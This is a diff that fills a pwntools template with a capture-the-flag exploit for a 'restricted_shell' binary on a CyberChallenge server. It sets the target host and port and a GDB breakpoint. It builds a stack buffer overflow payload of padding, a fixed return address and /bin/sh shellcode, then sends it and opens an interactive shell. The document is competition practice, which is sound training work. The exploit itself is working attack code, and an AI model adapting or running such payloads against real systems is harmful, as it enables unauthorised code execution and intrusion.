@@ -3,10 +3,10 @@
 from pwn import *
 
 context.terminal = ["tmux", "splitw", "-h"]
-exe = context.binary = ELF(args.EXE or './<binary>')
+exe = context.binary = ELF(args.EXE or './restricted_shell')
 
-host = args.HOST or '<host>.chall.srdnlen.it'
-port = int(args.PORT or 443)
+host = args.HOST or 'shell.challs.cyberchallenge.it'
+port = int(args.PORT or 9123)
 
 
 def start_local(argv=[], *a, **kw):
@@ -18,7 +18,7 @@ def start_local(argv=[], *a, **kw):
 
 def start_remote(argv=[], *a, **kw):
     '''Connect to the process on the remote host'''
-    io = connect(host, port, ssl=True)
+    io = connect(host, port)
     if args.GDB:
         gdb.attach(io, gdbscript=gdbscript)
     return io
@@ -31,13 +31,19 @@ def start(argv=[], *a, **kw):
         return start_remote(argv, *a, **kw)
 
 gdbscript = '''
-tbreak main
+b *0x8048547
 continue
 '''.format(**locals())
 
 # -- Exploit goes here --
 
 io = start()
+
+shell = asm(shellcraft.sh())
+
+payload = b"A" * 44 + flat(0x8048593) + shell
+
+io.sendlineafter(b"> ", payload)
 
 io.interactive()
 
